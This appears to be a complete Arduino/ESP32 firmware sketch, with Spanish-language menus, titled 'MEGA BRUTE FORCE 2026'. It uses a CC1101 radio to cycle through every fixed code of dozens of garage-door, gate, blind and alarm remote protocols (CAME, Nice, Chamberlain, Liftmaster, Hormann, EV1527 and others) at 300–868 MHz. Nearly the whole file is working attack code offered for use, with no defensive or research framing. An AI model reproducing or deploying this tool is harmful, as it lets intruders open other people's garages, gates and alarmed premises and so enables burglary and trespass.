#include <Arduino.h>
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <SPI.h>

// --- MEGA INCLUDES DE TODOS LOS PROTOCOLOS ---
#include "protocols/protocol.h"
#include "protocols/Came.h"
#include "protocols/NiceFlo.h"
#include "protocols/Ansonic.h"
#include "protocols/Chamberlain.h"
#include "protocols/Holtek.h"
#include "protocols/Linear.h"
#include "protocols/LinearMegaCode.h"
#include "protocols/Liftmaster.h"
#include "protocols/Princeton.h"
#include "protocols/EV1527.h"
#include "protocols/Doitrand.h"
#include "protocols/FAAC.h"
#include "protocols/StarLine.h"
#include "protocols/Clemsa.h"
#include "protocols/Dooya.h"
#include "protocols/Hormann.h"
#include "protocols/Marantec.h"
#include "protocols/SMC5326.h"
#include "protocols/Firefly.h"
#include "protocols/Tedsen.h"
#include "protocols/Nero.h"
#include "protocols/ELKA.h"
#include "protocols/Prastel.h"
#include "protocols/PhoenixV2.h"
#include "protocols/BFT.h"
#include "protocols/Airforce.h"
#include "protocols/Berner.h"
#include "protocols/IntertechnoV3.h"
#include "protocols/GateTX.h"
#include "protocols/Honeywell.h"
#include "protocols/Magellen.h"
#include "protocols/Phox.h"
#include "protocols/Unilarm.h"

#define RF2_CS   27
#define RF2_GDO0 26
#define RF2_TX   25 
#define FREQ_OFFSET 0.052 

int globalRepeats = 4;
float current_mhz = 0;

void setFrequencyCorrected(float target_mhz) {
    float corrected_mhz = target_mhz - FREQ_OFFSET;
    if (corrected_mhz == current_mhz) return;
    ELECHOUSE_cc1101.setMHZ(corrected_mhz);
    current_mhz = corrected_mhz;
    Serial.printf("\n[FREQ] RF2 -> Target: %.3f MHz | Software: %.3f MHz\n", target_mhz, corrected_mhz);
}

void setupCC1101() {
    SPI.begin(14, 12, 13);
    ELECHOUSE_cc1101.addSpiPin(14, 12, 13, RF2_CS, 1);
    ELECHOUSE_cc1101.addGDO0(RF2_GDO0, 1);
    ELECHOUSE_cc1101.setModul(1); 
    if (!ELECHOUSE_cc1101.getCC1101()) while (1) { Serial.println("ERROR: CC1101 no detectado"); delay(1000); }
    ELECHOUSE_cc1101.Init();
    ELECHOUSE_cc1101.setPktFormat(3);   
    ELECHOUSE_cc1101.setModulation(2);  
    ELECHOUSE_cc1101.setPA(10);         
    ELECHOUSE_cc1101.SetTx();           
    pinMode(RF2_TX, OUTPUT);
}

void sendPulse(int duration) {
    if (duration == 0) return;
    digitalWrite(RF2_TX, (duration > 0) ? HIGH : LOW);
    delayMicroseconds(abs(duration));
}

void attackBinary(c_rf_protocol* proto, const char* name, int bits, float mhz) {
    setFrequencyCorrected(mhz);
    uint32_t total = (1 << bits);
    Serial.printf("\n>>> Iniciando %s (%d bits) a %.2f MHz <<<", name, bits, mhz);
    for (uint32_t i = 0; i < total; i++) {
        if (i % 500 == 0) Serial.printf("  [%s] %.1f%%\n", name, (i * 100.0) / total);
        if (Serial.available() > 0) { Serial.read(); Serial.println("\n[!] CANCELADO."); return; }
        for (int r = 0; r < globalRepeats; r++) {
            for (int p : proto->pilot_period) sendPulse(p);
            for (int b = bits - 1; b >= 0; b--) {
                char bitChar = ((i >> b) & 1) ? '1' : '0';
                if(proto->transposition_table.count(bitChar))
                    for (int t : proto->transposition_table[bitChar]) sendPulse(t);
            }
            for (int s : proto->stop_bit) sendPulse(s);
            digitalWrite(RF2_TX, LOW); delay(8);
        }
        yield();
    }
}

void attackTristate(c_rf_protocol* proto, const char* name, int positions, float mhz) {
    setFrequencyCorrected(mhz);
    uint32_t total = 1;
    for(int p=0; p<positions; p++) total *= 3;
    Serial.printf("\n>>> Iniciando %s (%d pos) a %.2f MHz <<<", name, positions, mhz);
    for (uint32_t i = 0; i < total; i++) {
        if (i % 500 == 0) Serial.printf("  [%s] %.1f%%\n", name, (i * 100.0) / total);
        if (Serial.available() > 0) { Serial.read(); Serial.println("\n[!] CANCELADO."); return; }
        uint32_t temp = i;
        for (int r = 0; r < globalRepeats; r++) {
            for (int p : proto->pilot_period) sendPulse(p);
            for (int p = 0; p < positions; p++) {
                int val = temp % 3;
                char code = (val == 0) ? '0' : (val == 1 ? '1' : 'F');
                if(proto->transposition_table.count(code))
                    for (int t : proto->transposition_table[code]) sendPulse(t);
                temp /= 3;
            }
            temp = i; 
            for (int s : proto->stop_bit) sendPulse(s);
            digitalWrite(RF2_TX, LOW); delay(8);
        }
        yield();
    }
}

char waitKey() {
    while (Serial.available() == 0) delay(10);
    char c = Serial.read();
    while (Serial.available() > 0) Serial.read();
    return c;
}

void subMenuRepeats() {
    Serial.println("\n--- CONFIGURAR REPETICIONES ---");
    Serial.printf("Actual: %d veces por codigo\n", globalRepeats);
    Serial.println("Introduce un numero (1-9):");
    char c = waitKey();
    if (c >= '1' && c <= '9') { globalRepeats = c - '0'; Serial.printf("OK! Ajustado a %d\n", globalRepeats); }
}

// --- SUBMENÚS POR CATEGORÍA ---

void menu1() {
    while(true) {
        Serial.println("\n[1] MANDOS EUROPEOS (433.92)");
        Serial.println("0. ATACAR TODO EL BLOQUE");
        Serial.println("1. CAME (12 & 24 bits)");
        Serial.println("2. NiceFlo (12 & 24 bits)");
        Serial.println("3. Clemsa / FAAC / BFT / Ansonic");
        Serial.println("4. Gate-TX / Phox / Prastel / PhoenixV2");
        Serial.println("B. Volver");
        char c = waitKey();
        if (c == 'B' || c == 'b') return;
        if (c == '0' || c == '1') { protocol_came p; attackBinary(&p, "CAME 12b", 12, 433.92); attackBinary(&p, "CAME 24b", 24, 433.92); }
        if (c == '0' || c == '2') { protocol_nice_flo p; attackBinary(&p, "NiceFlo 12b", 12, 433.92); attackBinary(&p, "NiceFlo 24b", 24, 433.92); }
        if (c == '0' || c == '3') { 
            protocol_clemsa p1; attackBinary(&p1, "Clemsa", 12, 433.92);
            protocol_faac p2; attackBinary(&p2, "FAAC", 12, 433.92);
            protocol_bft_fixed p3; attackBinary(&p3, "BFT", 12, 433.92);
            protocol_ansonic p4; attackBinary(&p4, "Ansonic", 12, 433.92);
        }
        if (c == '0' || c == '4') {
            protocol_gate_tx p1; attackBinary(&p1, "GateTX", 12, 433.92);
            protocol_phox p2; attackBinary(&p2, "Phox", 12, 433.92);
            protocol_prastel p3; attackBinary(&p3, "Prastel", 12, 433.92);
            protocol_phoenix_v2 p4; attackBinary(&p4, "PhoenixV2", 12, 433.92);
        }
    }
}

void menu2() {
    while(true) {
        Serial.println("\n[2] MANDOS TRISTATE (Princeton/Chinos)");
        Serial.println("0. ATACAR TODO (Princeton + SMC)");
        Serial.println("1. Princeton (315 MHz)");
        Serial.println("2. Princeton (433.92 MHz)");
        Serial.println("3. SMC5326 (315 / 433.42 MHz)");
        Serial.println("B. Volver");
        char c = waitKey();
        if (c == 'B' || c == 'b') return;
        protocol_princeton p1; protocol_smc5326 p2;
        if (c == '0' || c == '1') attackTristate(&p1, "Princeton 315", 12, 315.00);
        if (c == '0' || c == '2') attackTristate(&p1, "Princeton 433", 12, 433.92);
        if (c == '0' || c == '3') { attackTristate(&p2, "SMC5326 315", 12, 315.00); attackTristate(&p2, "SMC5326 433", 12, 433.42); }
    }
}

void menu3() {
    while(true) {
        Serial.println("\n[3] DOMOTICA Y SENSORES");
        Serial.println("1. Dooya (Persianas) - 433.92");
        Serial.println("2. Honeywell WBD - 433.92");
        Serial.println("3. Nero Radio / Nero Sketch");
        Serial.println("4. Magellen - 433.92");
        Serial.println("B. Volver");
        char c = waitKey();
        if (c == 'B' || c == 'b') return;
        if (c == '1') { protocol_dooya p; attackBinary(&p, "Dooya", 24, 433.92); }
        if (c == '2') { protocol_honeywell p; attackBinary(&p, "Honeywell", 12, 433.92); }
        if (c == '3') { protocol_nero p; attackBinary(&p, "Nero Sketch", 12, 433.92); attackBinary(&p, "Nero Radio", 12, 434.42); }
        if (c == '4') { protocol_magellen p; attackBinary(&p, "Magellen", 12, 433.92); }
    }
}

void menu4() {
    while(true) {
        Serial.println("\n[4] USA GARAGE (Chamberlain/Liftmaster)");
        Serial.println("1. Chamberlain 7,8,9,12 bits (300/315/390/433)");
        Serial.println("2. Liftmaster (310/318/390/433)");
        Serial.println("B. Volver");
        char c = waitKey();
        if (c == 'B' || c == 'b') return;
        if (c == '1') { protocol_chamberlain p; for(float f : {300.0, 315.0, 390.0, 433.92}) for(int b : {7, 8, 9, 12}) attackBinary(&p, "Chamberlain", b, f); }
        if (c == '2') { protocol_liftmaster p; for(float f : {310.0, 318.0, 390.0, 433.92}) attackBinary(&p, "Liftmaster", 12, f); }
    }
}

void menu5() {
    while(true) {
        Serial.println("\n[5] AMERICANOS ANTIGUOS");
        Serial.println("1. Linear (10 bits) - 300/310 MHz");
        Serial.println("2. Linear Delta 3 - 318 MHz");
        Serial.println("3. Linear MegaCode - 318 MHz");
        Serial.println("4. Firefly - 300 MHz");
        Serial.println("B. Volver");
        char c = waitKey();
        if (c == 'B' || c == 'b') return;
        if (c == '1') { protocol_linear p; attackBinary(&p, "Linear 300", 10, 300.00); attackBinary(&p, "Linear 310", 10, 310.00); }
        if (c == '2') { protocol_linear p; attackBinary(&p, "Delta 3", 10, 318.00); }
        if (c == '3') { protocol_linear_megacode p; attackBinary(&p, "MegaCode", 24, 318.00); }
        if (c == '4') { protocol_firefly p; attackBinary(&p, "Firefly", 10, 300.00); }
    }
}

void menu6() {
    while(true) {
        Serial.println("\n[6] ALTA SEGURIDAD / 868 MHz");
        Serial.println("1. Hormann HSM - 868.35 MHz");
        Serial.println("2. Marantec - 868.35 MHz");
        Serial.println("3. Berner - 868.35 MHz");
        Serial.println("B. Volver");
        char c = waitKey();
        if (c == 'B' || c == 'b') return;
        if (c == '1') { protocol_hormann p; attackBinary(&p, "Hormann", 12, 868.35); }
        if (c == '2') { protocol_marantec p; attackBinary(&p, "Marantec", 12, 868.35); }
        if (c == '3') { protocol_berner p; attackBinary(&p, "Berner", 12, 868.35); }
    }
}

void menu7() {
    Serial.println("\n[7] INICIANDO INTERTECHNO V3 (32 BITS)...");
    protocol_intertechno_v3 p; attackBinary(&p, "Intertechno", 32, 433.92);
}

void menu8() {
    Serial.println("\n[8] INICIANDO ALARMAS 24 BITS (EV1527)...");
    protocol_ev1527 p; attackBinary(&p, "EV1527", 24, 433.92);
}

void menu9() {
    while(true) {
        Serial.println("\n[9] OTROS PROTOCOLOS");
        Serial.println("1. StarLine (Static)");
        Serial.println("2. Unilarm");
        Serial.println("3. Tedsen / Teletaster");
        Serial.println("4. Airforce / Berner 433");
        Serial.println("B. Volver");
        char c = waitKey();
        if (c == 'B' || c == 'b') return;
        if (c == '1') { protocol_starline p; attackBinary(&p, "StarLine", 12, 433.92); }
        if (c == '2') { protocol_unilarm p; attackBinary(&p, "Unilarm", 12, 433.42); }
        if (c == '3') { protocol_tedsen p; attackBinary(&p, "Tedsen", 12, 433.92); }
        if (c == '4') { protocol_airforce p1; attackBinary(&p1, "Airforce", 12, 433.92); protocol_berner p2; attackBinary(&p2, "Berner 433", 12, 433.92); }
    }
}

void showMainMenu() {
    Serial.println("\n==========================================");
    Serial.println("   MEGA BRUTE FORCE 2026 - ULTIMATE      ");
    Serial.println("==========================================");
    Serial.println("1. Europe Mandos (CAME, Nice, Clemsa...)");
    Serial.println("2. Tristate / Chinos (Princeton, SMC...)");
    Serial.println("3. Domotica / Persianas (Dooya, Nero...)");
    Serial.println("4. USA Garage (Chamberlain, Liftmaster)");
    Serial.println("5. USA Old (Linear, Firefly, MegaCode)");
    Serial.println("6. Europe 868 MHz (Hormann, Marantec)");
    Serial.println("7. Intertechno V3 (32 bits)");
    Serial.println("8. Alarmas 24 bits (EV1527)");
    Serial.println("9. Otros (StarLine, Tedsen, Airforce)");
    Serial.println("R. Ajustar REPETICIONES (Actual: " + String(globalRepeats) + ")");
    Serial.println("==========================================");
}

void setup() {
    Serial.begin(115200);
    delay(2000);
    setupCC1101();
    showMainMenu();
}

void loop() {
    if (Serial.available() > 0) {
        char c = Serial.read();
        while(Serial.available()) Serial.read();
        switch(c) {
            case '1': menu1(); break;
            case '2': menu2(); break;
            case '3': menu3(); break;
            case '4': menu4(); break;
            case '5': menu5(); break;
            case '6': menu6(); break;
            case '7': menu7(); break;
            case '8': menu8(); break;
            case '9': menu9(); break;
            case 'R': case 'r': subMenuRepeats(); break;
        }
        showMainMenu();
    }
}